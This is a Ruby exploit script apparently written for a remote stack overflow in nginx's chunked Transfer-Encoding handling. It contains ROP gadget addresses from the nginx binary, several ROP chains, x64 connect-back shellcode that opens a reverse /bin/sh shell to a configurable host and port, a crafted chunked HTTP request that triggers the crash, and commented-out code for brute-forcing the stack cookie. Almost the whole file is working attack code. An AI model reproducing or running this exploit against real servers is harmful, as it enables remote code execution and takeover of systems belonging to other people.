# encoding: ASCII
abort("#{$0} host port") if ARGV.length < 2
require 'ronin'

$count = 0

# rop address taken from nginx binary (find in the repo)
#poprdi = 0x00427006 
#poprsi = 0x0043a00e 
#poprdx = 0x0041b8fa 
#poprax = 0x00442c80 
#
#mmap64   = 0x4029b0
#mmapgot  = 0x67f290
#mmapaddr = 0x00410000
#
#rsito_rax_ = 0x0042afcb
#add_rdi_al = 0x00462de4
#base = 0x55b420e96000 
base = 0x555555554000
dummy = 0xAAAAAAAAAAAA
# rop address taken from nginx binary (find in the repo)
poprdi = 0x000000000000e233 + base
poprsi = 0x0000000000011b58 + base
poprdx = 0x000000000007f659 + base
poprax = 0x0000000000080f79 + base
poprcx = 0x00000000000842df + base

mmap64   = 0x000000000000d070 + base
mmapgot  = 0x28d068 + base
mmapaddr = 0x4150000000000000
memcpy_plt = 0x000000000000d7b0 + base

rsito_rax_ = 0x0000000000038295 + base
add_rdi_al = 0x000000000006eb2f + base

pushrax = 0x000000000004a5b0 # : push rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret 
pushrsp = 0x000000000008a78c
movrdx_rax = 0x0000000000061071 #: mov rax, rdx ; ret 
call_with_rax = 0x00000000000461fe #: mov rdi, rax ; call qword ptr [rdx]

mkdir_plt = 0xd820
open64_plt = 0x000000000000d3d0
stack_base = 0x7ffdd554c000
stack_size = 0x21000

string_base = 0x732ac 
private_anonymous_map = 0x22
# change mmap64 to mprotect, easier to find gadget
#$ropchain = [
#  poprax, 0x60,
#  poprdi, mmapgot,
#  add_rdi_al,
#
#  poprax, mmapgot,
#  poprdx, 0x7,
#  poprsi, 0x1000,
#  poprdi, mmapaddr,
#  mmap64
#].pack("Q*")

#$ropchain = [
#  poprdi, string_base,
#  poprsi, 0x64,
#  poprdx, 0x309,
#  open64_plt+base
#].pack("Q*")
poprcx_leave= 0x00000000000c31d9 + base
poprax_ret=0x000000000000c339 + base
mov_rcx_rdi=0x000000000003c43e + base
mov_rcx_rsi=0x000000000006edbf + base
close_at_plt=0x7ffff7fbff50
mkdir_nonplt=0x7ffff7fadc46
noticestring=0x555555602e75
poprsi=0x00007ffff7f7c689
#0x000000000003c43e : mov edx, 0 ; mov rdi, rcx ; call rax
#0x000000000006edbf : mov edx, 0 ; mov rsi, rcx ; call rax
#0x00000000000c31d9 : pop rcx ; cli ; call rsp
#0x0000000000024a36 : cwde ; mov rsi, rcx ; mov rdi, rdx ; call rax
#0x00000000000180e7 : mov rsi, rdx ; mov rdi, rcx ; call rax
#0x0000000000060615 : mov rcx, qword ptr [rbp - 0x10] ; mov rdi, rcx ; call rax

$ropchain = [
    poprax_ret,
    mkdir_nonplt,
    poprsi,
    0x309,
    base+0x0000000000060615,
    noticestring,
].pack("Q*")

#$ropchain = [
#  poprdi, string_base+base,
#  poprsi, 0x309,
#  mkdir_plt+base
#].pack("Q*")

#change mmap64 to mprotect, easier to find gadget
#$ropchain = [
#  poprcx, private_anonymous_map,
#  poprdx, 0x309,
#  poprsi, 0x1000,
#  poprdi, mmapaddr,
#  mmap64, pushrax, # Save mmap retval
#  dummy, dummy, dummy, dummy, dummy,
#  poprdx, 0x500,
#  poprsi
#
#].pack("Q*")

#connect back shellcode x64
ip = "0.0.0.0" 
port = 4000
sip = IPAddr::new(ip).to_i.pack(:int_be)
sport = port.pack(:int16_be)

$shellcode  = "\x48\x31\xd2\x48\x31\xc0\xb2\x02\x48\x89\xd7\xb2\x01\x48\x89\xd6\xb2\x06\xb0\x29\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\xbb#{sip}\x48\xc1\xe3\x20\x66\xb8#{sport}\xc1\xe0\x10\xb0\x02\x48\x09\xd8\x50\x48\x89\xe6\x48\x31\xd2\xb2\x10\x48\x31\xc0\xb0\x2a\x0f\x05\x48\x31\xf6\x48\x31\xc0\xb0\x21\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xf6\x48\x31\xd2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05\xc3"

$shellcode << ("\x90" * (8 - ($shellcode.length % 8)))

## copy the shellcode to mmapaddr
#(0...$shellcode.length).step(8) { |p|
#  code  = $shellcode[p,8].unpack(:uint64)[0]
#  chain = [poprax, mmapaddr + p, poprsi, code, rsito_rax_].pack("Q*")
#
#  $ropchain << chain
#}
# copy the shellcode to mmapaddr
(0...$shellcode.length).step(8) { |p|
  code  = $shellcode[p,8].unpack(:uint64)[0]
  chain = [code].pack("Q*")

  $ropchain << chain
}

# finally jump to it
$ropchain << mmapaddr.pack(:uint64) 

# payload for crash
$payload = [ 
  "GET / HTTP/1.1\r\n",
  "Host: 1337.vnsec.net\r\n",
  "Accept: */*\r\n",
  "Transfer-Encoding: chunked\r\n\r\n"
].join
$chunk = "f"*(1024-$payload.length-8) + "0f0f0f0f"
$payload << $chunk

def crash(cookie, cookie_test=true)
  data = ''
  payload = $payload.dup
  #payload << ["A"*(4096+8), cookie].join
  payload << ["A"*(4200)].join
  payload << ["C"*8,0x7fffffffdc80.pack("Q*"), $ropchain].join unless cookie_test

  5.times do
    tcp_session(ARGV[0],ARGV[1].to_i) do |s|
      $count += 1
      s.send(payload, 0)
      data = s.recv(10)
    end

    return true if data.strip.empty?
  end

  return false
end

#s = [0]
#if ARGV.length < 3
#  # test cookie
#  while s.length < 8
#    print_info "searching for byte: #{s.length}"
#    (1..255).each do |c|
#      print "\r#{c}"
#      s1 = s + [c]
#
#      unless crash(s1.pack("c*"))
#        s << c
#        puts
#        break
#      end
#    end
#  end
#  s = s.pack("c*")
#else
#  # try it ?
#  s = (ARGV[2]).gsub("\\x","").hex_decode
#
#  if crash(s)
#    print_error "Wrong cookie"
#    exit
#  end
#end
#
#print_info "Found cookie: #{s.hex_escape} #{s.length}"

print_info "PRESS ENTER TO SEND ROP PAYLOAD"
$stdin.readline 

#crash(s, false)
crash(0x6464646464646464, false)
print_info "#{$count} connections"
